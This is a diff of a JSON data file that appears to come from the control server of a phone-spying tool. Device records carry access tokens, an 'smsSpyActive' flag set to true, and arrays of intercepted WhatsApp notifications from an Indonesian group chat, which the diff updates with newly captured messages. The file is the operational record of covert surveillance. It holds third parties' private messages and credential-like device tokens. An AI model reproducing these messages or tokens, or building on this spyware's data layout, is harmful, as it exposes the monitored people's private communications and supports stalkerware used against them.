@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775041918792,
+    "lastSeen": 1775041939618,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14734 pesan dari 11 chat",
+        "time": "01/04 19:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775041941821
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12409 pesan): ~ 🕷️",
+        "content": ".bratgambar ga ngerti bahasa kodok",
+        "time": "01/04 19:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775041941758
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12408 pesan): ~ 🕷️",
@@ -4003,22 +4019,6 @@
         "time": "01/04 19:00",
         "pkg": "com.whatsapp",
         "receivedAt": 1775041241335
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12288 pesan): ~ 🕷️",
-        "content": "pelet aja ka,di jamin ga akan putus",
-        "time": "01/04 19:00",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775041241239
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14623 pesan dari 11 chat",
-        "time": "01/04 19:00",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775041240236
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775041916481,
+    "lastSeen": 1775041940512,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12409 pesan): ~ 🕷️",
+        "content": ".bratgambar ga ngerti bahasa kodok",
+        "time": "01/04 19:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775041941738
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8056,14 +8064,6 @@
         "time": "01/04 19:00",
         "pkg": "com.whatsapp",
         "receivedAt": 1775041241252
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14623 pesan dari 11 chat",
-        "time": "01/04 19:00",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775041239354
       }
     ],
     "galleryPhotos": [],
